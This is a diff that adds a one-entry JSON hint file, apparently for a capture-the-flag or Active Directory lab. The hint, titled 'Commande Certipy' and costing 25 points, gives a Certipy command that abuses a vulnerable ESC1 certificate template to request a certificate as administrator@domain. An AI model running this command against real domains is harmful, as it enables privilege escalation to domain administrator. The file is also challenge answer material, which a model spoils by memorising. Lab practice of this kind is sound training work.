@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Commande Certipy",
+    "cost": 25,
+    "content": "certipy req -u user@domain -p pass -ca CA_NAME -template ESC1_Temp -upn administrator@domain"
+  }
+]
